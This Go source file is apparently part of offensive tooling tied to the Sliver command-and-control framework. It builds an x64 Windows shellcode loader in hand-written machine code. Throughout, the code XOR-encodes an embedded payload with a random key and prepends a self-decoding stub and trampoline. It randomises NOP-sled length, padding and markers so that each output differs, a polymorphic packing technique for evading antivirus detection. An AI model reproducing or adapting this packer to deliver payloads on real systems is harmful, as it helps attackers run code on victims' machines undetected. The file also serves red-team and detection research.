package churro

import (
	"bytes"
	"crypto/rand"
	"encoding/binary"
	"fmt"
	"io"

	"github.com/sliverarmory/churro/internal/assets"
)

// buildLoader wraps the prebuilt x64 Windows loader with an instance, a stack
// alignment entry, and an in-place decoder. All host-side assembly and patching
// is Go; the embedded runtime image is the same loader used by Fritter.
func buildLoader(instance []byte, entropy io.Reader) ([]byte, error) {
	if len(instance) == 0 || len(instance) > int(^uint32(0)>>1) {
		return nil, fmt.Errorf("invalid instance size %d", len(instance))
	}
	if entropy == nil {
		entropy = rand.Reader
	}
	var variant [1]byte
	if _, err := io.ReadFull(entropy, variant[:]); err != nil {
		return nil, fmt.Errorf("select loader image: %w", err)
	}
	loader := assets.LoaderPEB1
	if variant[0]&1 != 0 {
		loader = assets.LoaderPEB2
	}
	combined, err := prepareCombined(loader, assets.DispatchShim, entropy)
	if err != nil {
		return nil, err
	}

	// Each generation picks a fresh key and a different prefix length. The
	// decoder masks its key index, so only power-of-two lengths are supported.
	if _, err := io.ReadFull(entropy, variant[:]); err != nil {
		return nil, fmt.Errorf("select decoder key length: %w", err)
	}
	keyLen := []int{4, 8, 16}[int(variant[0])%3]
	key := make([]byte, keyLen)
	if _, err := io.ReadFull(entropy, key); err != nil {
		return nil, fmt.Errorf("generate decoder key: %w", err)
	}
	decoder, fixups, err := makeDecoder(uint32(len(combined)), key)
	if err != nil {
		return nil, err
	}
	if _, err := io.ReadFull(entropy, variant[:]); err != nil {
		return nil, fmt.Errorf("select prefix size: %w", err)
	}
	prefix := bytes.Repeat([]byte{0x90}, int(variant[0]&0x3f))

	// CALL jumps over instance bytes. POP RCX at the target recovers their
	// address. The RSP frame returns to its own epilogue when the shim returns.
	entry := make([]byte, 0, 32)
	entry = append(entry, 0x55, 0x48, 0x89, 0xe5)       // push rbp; mov rbp,rsp
	entry = append(entry, 0x48, 0x83, 0xe4, 0xf0)       // and rsp,-16
	entry = append(entry, 0x48, 0x83, 0xec, 0x20)       // sub rsp,32 (shadow space)
	entry = append(entry, 0xe8, 0x05, 0, 0, 0)          // call over epilogue
	entry = append(entry, 0x48, 0x89, 0xec, 0x5d, 0xc3) // mov rsp,rbp; pop rbp; ret

	// The trampoline first supplies RDX with the decoded shim address, then
	// jumps over the page padding. The shim and loader start on page boundaries.
	tramp := []byte{0x48, 0x8d, 0x15, 0, 0, 0, 0, 0xe9, 0, 0, 0, 0}
	preBlob := len(prefix) + 5 + len(instance) + 1 + len(entry) + len(decoder) + len(tramp)
	pagePad := (4096 - preBlob%4096) % 4096
	encodedStart := len(decoder) + len(tramp) + pagePad
	if err := patchDecoder(decoder, fixups, encodedStart); err != nil {
		return nil, err
	}
	binary.LittleEndian.PutUint32(tramp[3:7], uint32(len(tramp)-7+pagePad))
	binary.LittleEndian.PutUint32(tramp[8:12], uint32(pagePad))

	for i := range combined {
		combined[i] ^= key[i&(keyLen-1)]
	}
	result := make([]byte, 0, preBlob+pagePad+len(combined))
	result = append(result, prefix...)
	result = append(result, 0xe8)
	result = binary.LittleEndian.AppendUint32(result, uint32(len(instance)))
	result = append(result, instance...)
	result = append(result, 0x59) // pop rcx
	result = append(result, entry...)
	result = append(result, decoder...)
	result = append(result, tramp...)
	pad := make([]byte, pagePad)
	if _, err := io.ReadFull(entropy, pad); err != nil {
		return nil, fmt.Errorf("generate page padding: %w", err)
	}
	result = append(result, pad...)
	result = append(result, combined...)
	return result, nil
}

type decoderFixups struct {
	keyDisp, keyEnd   int
	dataDisp, dataEnd int
	keyStart          int
}

func makeDecoder(combinedSize uint32, key []byte) ([]byte, decoderFixups, error) {
	if len(key) != 4 && len(key) != 8 && len(key) != 16 {
		return nil, decoderFixups{}, fmt.Errorf("invalid decoder key length %d", len(key))
	}
	// Windows x64: RSI=key, RDI=encoded data, ECX=count, BL=key index.
	// Preserve RCX while it carries the instance pointer into the shim.
	d := []byte{0x51, 0x48, 0x8d, 0x35, 0, 0, 0, 0}
	f := decoderFixups{keyDisp: 4, keyEnd: 8}
	d = append(d, 0x48, 0x8d, 0x3d, 0, 0, 0, 0)
	f.dataDisp, f.dataEnd = 11, 15
	d = append(d, 0xb9)
	d = binary.LittleEndian.AppendUint32(d, combinedSize)
	d = append(d, 0x31, 0xdb) // xor ebx,ebx
	loop := len(d)
	d = append(d,
		0x8a, 0x04, 0x1e, // mov al,[rsi+rbx]
		0x30, 0x07, // xor [rdi],al
		0x48, 0xff, 0xc7, // inc rdi
		0xfe, 0xc3, // inc bl
		0x80, 0xe3, byte(len(key)-1), // and bl,key mask
		0xff, 0xc9, // dec ecx
		0x75, 0, // jnz loop
	)
	jnzNext := len(d)
	rel := loop - jnzNext
	if rel < -128 || rel > 127 {
		return nil, decoderFixups{}, fmt.Errorf("decoder loop exceeds rel8 range")
	}
	d[jnzNext-1] = byte(int8(rel))
	d = append(d, 0x59, 0xeb, byte(len(key))) // pop rcx; skip key
	f.keyStart = len(d)
	d = append(d, key...)
	return d, f, nil
}

func patchDecoder(d []byte, f decoderFixups, encodedStart int) error {
	keyRel := f.keyStart - f.keyEnd
	dataRel := encodedStart - f.dataEnd
	if keyRel < 0 || dataRel < 0 {
		return fmt.Errorf("invalid decoder displacement")
	}
	binary.LittleEndian.PutUint32(d[f.keyDisp:f.keyDisp+4], uint32(keyRel))
	binary.LittleEndian.PutUint32(d[f.dataDisp:f.dataDisp+4], uint32(dataRel))
	return nil
}

func prepareCombined(loaderImage, shimImage []byte, entropy io.Reader) ([]byte, error) {
	if len(loaderImage) == 0 || len(shimImage) < 16 {
		return nil, fmt.Errorf("missing embedded Windows loader")
	}
	shimPadded := (len(shimImage) + 4095) &^ 4095
	combined := make([]byte, shimPadded+len(loaderImage))
	copy(combined, shimImage)
	if _, err := io.ReadFull(entropy, combined[len(shimImage):shimPadded]); err != nil {
		return nil, fmt.Errorf("generate shim padding: %w", err)
	}
	copy(combined[shimPadded:], loaderImage)
	patches := map[uint32]uint32{0xDEAD0001: uint32(shimPadded), 0xDEAD0002: uint32(len(loaderImage))}
	for i := 0; i+4 <= len(shimImage); i++ {
		value := binary.LittleEndian.Uint32(combined[i : i+4])
		if replacement, ok := patches[value]; ok {
			binary.LittleEndian.PutUint32(combined[i:i+4], replacement)
			delete(patches, value)
		}
	}
	if len(patches) != 0 {
		return nil, fmt.Errorf("dispatch shim sentinels are missing")
	}
	marker := []byte{0xb1, 0x7a, 0x7e, 0xf1, 0xb1, 0x7a, 0x7e, 0xf1}
	ft := bytes.Index(combined[:len(shimImage)], marker)
	if ft < 0 || ft+28 > len(shimImage) {
		return nil, fmt.Errorf("dispatch shim function table is missing")
	}
	var fnKey [1]byte
	for fnKey[0] == 0 {
		if _, err := io.ReadFull(entropy, fnKey[:]); err != nil {
			return nil, fmt.Errorf("generate dispatch key: %w", err)
		}
	}
	binary.LittleEndian.PutUint32(combined[ft+8:ft+12], 1) // one loader section
	binary.LittleEndian.PutUint32(combined[ft+16:ft+20], 0)
	binary.LittleEndian.PutUint32(combined[ft+20:ft+24], uint32(len(loaderImage)))
	combined[ft+24] = fnKey[0]
	combined[ft+25] = 0x02 // shim decrypts whole loader before entry
	combined[ft+26], combined[ft+27] = 0, 0
	for i := shimPadded; i < len(combined); i++ {
		combined[i] ^= fnKey[0]
	}
	if _, err := io.ReadFull(entropy, combined[ft:ft+8]); err != nil {
		return nil, fmt.Errorf("scramble function table marker: %w", err)
	}
	return combined, nil
}
